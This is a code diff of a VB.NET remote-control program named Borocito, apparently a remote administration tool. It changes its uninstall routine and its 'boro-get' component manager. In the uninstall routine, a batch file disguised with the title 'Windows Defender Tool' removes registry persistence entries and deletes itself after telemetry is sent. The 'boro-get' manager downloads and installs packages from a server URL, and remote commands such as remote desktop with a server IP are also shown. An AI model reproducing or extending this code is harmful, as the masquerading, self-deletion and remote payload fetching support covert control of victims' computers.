@@ -101,7 +101,7 @@ Module Payloads
     Sub Restart()
         Try
             AddToLog("Restart@Payloads", "Restarting....", True)
-            Process.Start(DIRCommons & "\Borocito.exe")
+            Process.Start(DIRCommons & "\BorocitoUpdater.exe")
             End
         Catch ex As Exception
             AddToLog("Restart@Payloads", "Error" & ex.Message, True)
@@ -110,8 +110,9 @@ Module Payloads
     Sub Uninstall()
         Try
             AddToLog("Uninstall@Payloads", "Uninstalling, goodbye!....", True)
-            If My.Computer.FileSystem.FileExists(DIRCommons & "\Uninstall.cmd") = True Then
-                My.Computer.FileSystem.DeleteFile(DIRCommons & "\Uninstall.cmd")
+            Dim uninstallFile As String = DIRTemp & "\UninstallerTool.cmd"
+            If My.Computer.FileSystem.FileExists(uninstallFile) = True Then
+                My.Computer.FileSystem.DeleteFile(uninstallFile)
             End If
             Dim Reg_BorocitoConfig As String = "reg delete " & """" & "HKEY_CURRENT_USER\SOFTWARE\Borocito" & """" & " /f" 'Borocito configuration
             Dim Reg_StartAsAdmin As String = "reg delete " & """" & "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" & """" & " /v " & """" & Application.ExecutablePath & """" & " /f"
@@ -123,16 +124,23 @@ Module Payloads
             Dim File_ExtractorTemp As String = "IF EXIST " & """" & DIRTemp & "\BoroExtractor.exe" & """" & " DEL /F " & """" & DIRTemp & "\BoroExtractor.exe" & """"
             Dim Dir_DIRCommons As String = "rmdir /q /s " & """" & DIRCommons & """"
             Dim FinalContent As String = "@echo off /c " & "title Windows Defender Tool" &
-                " & " & Reg_BorocitoConfig &
-                " & " & Reg_StartAsAdmin &
-                " & " & Reg_StartWithWindows &
-                " & " & File_StartWithWindows1 &
-                " & " & File_StartWithWindows2 &
-                " & " & File_StartWithWindows3 &
-                " & " & File_UpdaterTemp &
-                " & " & File_ExtractorTemp &
-                " & " & Dir_DIRCommons
-            Process.Start("cmd.exe", FinalContent)
+                vbCrLf & Reg_BorocitoConfig &
+                vbCrLf & Reg_StartAsAdmin &
+                vbCrLf & Reg_StartWithWindows &
+                vbCrLf & File_StartWithWindows1 &
+                vbCrLf & File_StartWithWindows2 &
+                vbCrLf & File_StartWithWindows3 &
+                vbCrLf & File_UpdaterTemp &
+                vbCrLf & File_ExtractorTemp &
+                vbCrLf & Dir_DIRCommons &
+                vbCrLf & "start /b " & """" & """" & " cmd /c del " & """" & "%~f0" & """" & "&exit /b"
+            If My.Computer.FileSystem.FileExists(uninstallFile) Then
+                My.Computer.FileSystem.DeleteFile(uninstallFile)
+            End If
+            My.Computer.FileSystem.WriteAllText(uninstallFile, FinalContent, False, System.Text.Encoding.ASCII)
+            AddToLog("SeeYou Protocol", "Shutting down... Goodbye, has been a pleasure! :,D ", True)
+            SendTelemetry()
+            Process.Start(uninstallFile)
             End
         Catch ex As Exception
             AddToLog("Uninstall@Payloads", "Error" & ex.Message, True)
@@ -163,6 +171,7 @@ Module BOROGET
 
     Function BORO_GET_ADMIN(ByVal command As String) As String
         Try
+            AddToLog("BOROGET", "Processing: " & command, False)
             'EJEMPLOS
             '   PACKET boro-get RMTDSK|True|-ServerIP=0.0.0.0 -ServerPort=15243
             '   INSTALL boro-get install
@@ -199,9 +208,9 @@ Module BOROGET
             Return "Error parsing 'boro-get' command."
         End Try
     End Function
-
     Function InstallBOROGET() As String
         Try
+            AddToLog("BOROGET", "Installing boro-get...", False)
             If Not My.Computer.FileSystem.DirectoryExists(DIRBoroGetInstallFolder) Then
                 My.Computer.FileSystem.CreateDirectory(DIRBoroGetInstallFolder)
             End If
@@ -209,8 +218,10 @@ Module BOROGET
                 My.Computer.FileSystem.DeleteFile(zipPackageFile)
             End If
             'Descargar desde el servidor
+            AddToLog("BOROGET", "Downloading boro-get...", False)
             My.Computer.Network.DownloadFile(GetIniValue("Components", "boro-get", DIRCommons & "\General.ini"), zipPackageFile)
             'Instalar
+            AddToLog("BOROGET", "Extracting boro-get...", False)
             ZipFile.ExtractToDirectory(zipPackageFile, DIRBoroGetInstallFolder)
             'Registra
             Dim regKey As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get", True)
@@ -231,6 +242,7 @@ Module BOROGET
     Function UninstallBOROGET() As String
         Try
             'Eliminar
+            AddToLog("BOROGET", "Uninstalling boro-get...", False)
             If My.Computer.FileSystem.DirectoryExists(DIRBoroGetInstallFolder) Then
                 My.Computer.FileSystem.DeleteDirectory(DIRBoroGetInstallFolder, FileIO.DeleteDirectoryOption.DeleteAllContents)
             End If
@@ -248,6 +260,7 @@ Module BOROGET
     End Function
     Function SetBOROGET(ByVal regKey As String, ByVal regValue As String) As String
         Try
+            AddToLog("BOROGET", "Setting boro-get...", False)
             Dim RegeditBoroGet As RegistryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Borocito\\boro-get", True)
             If RegeditBoroGet Is Nothing Then
                 Registry.CurrentUser.CreateSubKey("SOFTWARE\\Borocito\\boro-get")
